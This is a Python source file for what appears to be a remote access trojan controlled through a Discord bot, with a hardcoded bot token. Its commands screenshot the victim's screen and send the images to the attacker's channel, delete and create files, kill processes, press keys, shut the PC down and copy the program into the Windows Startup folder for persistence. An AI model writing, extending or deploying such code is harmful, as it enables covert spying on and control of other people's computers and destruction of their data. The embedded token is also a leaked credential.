from discord.ext import commands
import discord,pyautogui,string,random,os,webbrowser,keyboard,time,pyscreeze
 
BOT_TOKEN = "MTI3MzM4MjUwMTcyNDcxNzE2Ng.Gs96vX.T1xBKIrctAPxPBLnPaDBakosP1ozoa63ONaP5g"
CHANNEL_ID = 1273384164212867082
username = os.getlogin()
id = random.randint(1000,9999)

def name_generator(size=6, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))


bot = commands.Bot(command_prefix="!",intents=discord.Intents.all())

@bot.event
async def on_ready():
    global id
    print("Connected to server")
    channel = bot.get_channel(CHANNEL_ID)
    await channel.send("[Session] New Connection! ID: " + str(id))



@bot.command()
async def newchannel(ctx,id):
    guild = ctx.message.guild
    await guild.create_text_channel("Session " + str(id))


@bot.command()
async def ss(ctx):
    e = name_generator()
    pyautogui.screenshot("Chache/"+ e + ".png")
    with open("Chache/" + e +".png","rb") as f:
        picture = discord.File(f)
        f.close()
    await ctx.send(file=picture)


@bot.command()
async def shutdown(ctx):
    await ctx.send("[Session] Shutting down...")
    os.system("shutdown /s /t 1")


@bot.command()
async def openlink(ctx,link,amount):
    for i in range(int(amount)):
        webbrowser.open(link)
    await ctx.send("Opened " + link + " " + amount + " times")

@bot.command()
async def stopconnection(ctx,idnew):
    global id
    if int(idnew) == id:
        await ctx.send("[Session] Connection stopped.")
        await ctx.send("**-------------------------------------------------------------------------------------------------**")
        exit()

@bot.command()
async def getid(ctx):
    global id
    await ctx.send("The id is: " + str(id))


@bot.command()
async def cmds(ctx):
    await ctx.send("Your commands are the following:\n\n!altf4 (delay) ~ altf4s the user\n!autostartadd ~ adds the program to users autostart folder\n!cfod (filename) (text) ~ creates a file on the users desktop\n!cmds ~ lets you see all commands\n!delfile (name) (location) ~ deletes a file\n!endtask (task) ~ ends a task on users pc\n!getid ~ returns the id of active session\n!newchannel (id) ~ opens a new session-channel\n!openfile (name) (location) ~ opens a file\n!openlink (address) (amount) ~ opens one or mulitiple link in the standard browser\n!presskey (key) (delay) ~ presses a key\n!ss ~ takes a screenshot\n!shutdown ~ turns off the computer\n!stopconnection (id) ~ ends the connection")


@bot.command()
async def cfod(ctx,name,text):
    with open(f"C:\\Users\\{username}\\Desktop\\" + name,"w") as f:
        f.write(text)
        f.close()
    await ctx.send("[Session] Created " + name + ' with the text "' + text + '" on users Desktop.')

@bot.command()
async def altf4(ctx,delay):
    if int(delay) > 0 and not None:
        time.sleep(int(delay))
    keyboard.press("Alt+F4")
    keyboard.release("Alt+F4")
    await ctx.send("[Session] AltF4d user.")

@bot.command()
async def presskey(ctx,key,delay):
    if int(delay) > 0 and not None:
        time.sleep(int(delay))
    keyboard.press_and_release(key)
    await ctx.send("[Session] Pressed " + key + ".")

@bot.command()
async def openfile(ctx,name,location):
    os.startfile(f"C:\\Users\\{username}\\{location}\\" + name)
    await ctx.send("[Session] Opened " + name + "in the directory" + location + ".")

@bot.command()
async def delfile(ctx,name,location):
    os.remove(f"C:\\Users\\{username}\\{location}\\" + name)
    await ctx.send("[Session] Removed " + name + " from " + location + ".")

@bot.command()
async def autostartadd(ctx):
    with open('Chache/text.txt', 'r') as f:
             text = f.read()
             f.close()
    with open("C:\\users\\" + username + r"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bot.py",'a') as f:
            f.write(text)
            f.close()
    await ctx.send("[Session] Added program to autostart.")

@bot.command()
async def endtask(ctx,task):
    os.system("taskkill /f /im " + task)
    await ctx.send("[Session] Ended " + task)

@bot.command()
async def click(ctx,rl):
    if rl == "r":
        pyautogui.rightClick()
        await ctx.send("[Session] Right clicked.")
    if rl == "l":
        pyautogui.leftClick()
        await ctx.send("[Session] Left clicked.")


bot.run(BOT_TOKEN)
